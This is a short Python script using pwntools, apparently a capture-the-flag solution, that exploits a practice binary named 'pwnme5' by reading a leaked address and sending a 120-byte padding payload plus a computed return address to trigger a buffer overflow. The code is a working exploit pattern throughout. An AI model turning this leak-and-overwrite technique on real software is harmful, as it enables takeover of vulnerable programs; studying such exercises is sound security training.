import pwn
from templates import buff_overflow, get_addr_from_leak


def main():
    # start up the binary
    pwn.context.arch = 'amd64'
    proc = pwn.process('./pwnme5')

    proc.recvuntil(b"dropped this: 0x")
    leak = proc.recvline()[:-1]  # make sure to not get the new line at the end

    payload = b"a" * (112 + 8) + get_addr_from_leak("./pwnme5", leak.decode("ascii"), skip_amt=3)
    buff_overflow(
        payload,
        proc,
        interactive = False
    )


main()
